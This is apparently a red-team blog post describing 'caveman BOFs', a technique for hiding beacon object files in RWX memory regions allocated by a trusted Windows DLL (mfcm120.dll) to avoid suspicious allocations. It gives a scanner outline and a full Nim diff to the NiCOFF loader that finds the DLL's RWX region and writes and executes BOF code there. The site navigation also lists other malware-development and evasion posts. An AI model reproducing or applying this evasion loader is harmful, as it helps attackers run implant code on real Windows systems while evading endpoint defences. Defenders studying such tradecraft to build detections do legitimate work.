# https://tishina.in/execution/caveman-bofs

[![](https://publish-01.obsidian.md/access/c7ce07c5421851d0d6a9c4b6320620d9/images/simple.png)](https://tishina.in/home)

appsec

execution

[bof-lazy-loading](https://tishina.in/execution/bof-lazy-loading)

[byovm](https://tishina.in/execution/byovm)

[caveman-bofs](https://tishina.in/execution/caveman-bofs)

[DOUBLEGOD-and-insomnia-loader](https://tishina.in/execution/DOUBLEGOD-and-insomnia-loader)

[golang-winmaldev-basics](https://tishina.in/execution/golang-winmaldev-basics)

[linux-evasion-primitives](https://tishina.in/execution/linux-evasion-primitives)

[nim-fibers](https://tishina.in/execution/nim-fibers)

[nim-noload-dll-hollowing](https://tishina.in/execution/nim-noload-dll-hollowing)

[phase-dive-sleep-obfuscation](https://tishina.in/execution/phase-dive-sleep-obfuscation)

[pyd-execute-assembly](https://tishina.in/execution/pyd-execute-assembly)

[python-inmemory-bof](https://tishina.in/execution/python-inmemory-bof)

[replacing-memfd-with-fuse](https://tishina.in/execution/replacing-memfd-with-fuse)

initial-access

ops

opsec

[home](https://tishina.in/home)

[![](https://publish-01.obsidian.md/access/c7ce07c5421851d0d6a9c4b6320620d9/images/simple.png)](https://tishina.in/home)

# caveman-bofs

# tl;dr

When looking at the NiCOFF implementation for BOF loading when writing [nimplant-first-look](https://tishina.in/opsec/nimplant-first-look), I was also thinking of maybe loading NimPlant in an RWX section allocated by some trusted library. It is too big for that, but guess what isn't? BOFs.

Techniques for using RWX library sections for loading code are well-known, but what if we used a region that is allocated by DllMain instead (or at least that's what I think happens). It works with little changes (before shamefully crashing):

![Pasted image 20230728160533.png](https://publish-01.obsidian.md/access/c7ce07c5421851d0d6a9c4b6320620d9/images/Pasted%20image%2020230728160533.png)

# scanner

The scanner is available on [https://gist.github.com/zimnyaa/a80063d723bc9f894322ed37bf304b73](https://gist.github.com/zimnyaa/a80063d723bc9f894322ed37bf304b73), but it is very simple:

```j
list libraries in C:\Windows\System32\ ->
	LoadLibraryA ->
		Look for RWX regions ->
			FreeLibrary ->
				repeat
```

I've found a bunch of libraries this way. They all can be unstable, are limited in memory size, and I urge you to try a bunch of them out. I've used `mfcm120.dll`.

# using the region

The code is based on [NiCOFF](https://github.com/frkngksl/NiCOFF), and the logic is simple:

```j
list RWX memory regions ->
	load a library ->
		find the new RWX region ->
			write a BOF to it and execute it ->
				crash because this is a PoC
```

NiCOFF is easier to adapt than COFFLoader since it only allocates the memory once.

Here's the diff (also on [gist](https://gist.github.com/zimnyaa/c5a06a774255ca087d1453c681a671aa)):

```diff
diff --git a/Main.nim b/Main.nim
index ef19f4c..c133586 100644
--- a/Main.nim
+++ b/Main.nim
@@ -128,7 +128,7 @@ proc ApplyGeneralRelocations(patchAddress:uint64,sectionStartAddress:uint64,give
             echo "[!] No code for type: ",givenType

 var allocatedMemory:LPVOID = nil
-
+var caveLibH: HANDLE
 proc RunCOFF(functionName:string,fileBuffer:seq[byte],argumentBuffer:seq[byte]):bool =
     var fileHeader:ptr FileHeader = cast[ptr FileHeader](unsafeAddr(fileBuffer[0]))
     var totalSize:uint64 = 0
@@ -172,7 +172,38 @@ proc RunCOFF(functionName:string,fileBuffer:seq[byte],argumentBuffer:seq[byte]):
         echo "[!] Text section is not found!"
         return false
     # We need to store external function addresses too
-    allocatedMemory = VirtualAlloc(NULL, cast[UINT32](totalSize+GetNumberOfExternalFunctions(fileBuffer,textSectionHeader)), MEM_COMMIT or MEM_RESERVE or MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE)
+    #allocatedMemory = VirtualAlloc(NULL, cast[UINT32](totalSize+GetNumberOfExternalFunctions(fileBuffer,textSectionHeader)), MEM_COMMIT or MEM_RESERVE or MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE)
+
+    echo "need size:", totalSize+GetNumberOfExternalFunctions(fileBuffer,textSectionHeader)
+    # FORK STARTS HERE
+    var mbi: MEMORY_BASIC_INFORMATION
+    var offset: LPVOID
+    var process: HANDLE = GetCurrentProcess()
+    var pages = newSeq[int](0)
+
+    # enumerating current RWX regions
+    while VirtualQueryEx(process, offset, addr(mbi), sizeof(mbi)) != 0:
+        offset = cast[LPVOID](cast[DWORD_PTR](mbi.BaseAddress) + mbi.RegionSize)
+        if mbi.AllocationProtect == PAGE_EXECUTE_READWRITE and mbi.State == MEM_COMMIT and mbi.Type == MEM_PRIVATE:
+          if cast[int](mbi.BaseAddress) notin pages:
+            pages.add(cast[int](mbi.BaseAddress))
+            echo " ! old RWX: 0x", toHex(cast[int](mbi.BaseAddress)), " | size: ", mbi.RegionSize
+    # adding a new one
+    caveLibH = LoadLibraryA("C:\\Windows\\System32\\mfcm120.dll")
+
+
+    # finding it again
+    offset = NULL
+    var oldprotect: DWORD
+    while VirtualQueryEx(process, offset, addr(mbi), sizeof(mbi)) != 0:
+        offset = cast[LPVOID](cast[DWORD_PTR](mbi.BaseAddress) + mbi.RegionSize)
+        if mbi.AllocationProtect == PAGE_EXECUTE_READWRITE and mbi.State == MEM_COMMIT and mbi.Type == MEM_PRIVATE:
+          if cast[int](mbi.BaseAddress) notin pages:
+            echo " ! RWX: 0x", toHex(cast[int](mbi.BaseAddress)), " | size: ", mbi.RegionSize
+            allocatedMemory = mbi.BaseAddress
+    echo "will load to 0x", toHex(cast[int](allocatedMemory))
+
+    # FORK ENDS HERE
     if(allocatedMemory == NULL):
         echo "[!] Failed for memory allocation!"
         return false
@@ -261,15 +292,16 @@ when isMainModule:
     # Run COFF file
     if(not RunCOFF(paramStr(2),fileBuffer,argumentBuffer)):
         echo "[!] Error on executing file!"
-        VirtualFree(allocatedMemory, 0, MEM_RELEASE)
+        #VirtualFree(allocatedMemory, 0, MEM_RELEASE)
+        FreeLibrary(caveLibH)
         quit(0)
     echo "[+] COFF File is Executed!"
     var outData:ptr char = BeaconGetOutputData(NULL);
     if(outData != NULL):
         echo "[+] Output Below:\n\n"
         echo $outData
-    VirtualFree(allocatedMemory, 0, MEM_RELEASE)
-
+    # VirtualFree(allocatedMemory, 0, MEM_RELEASE)
+    FreeLibrary(caveLibH)



```

caveman-bofs

Not found

This page does not exist

Interactive graph

On this page

tl;dr

scanner

using the region

[Powered by Obsidian Publish](https://publish.obsidian.md/)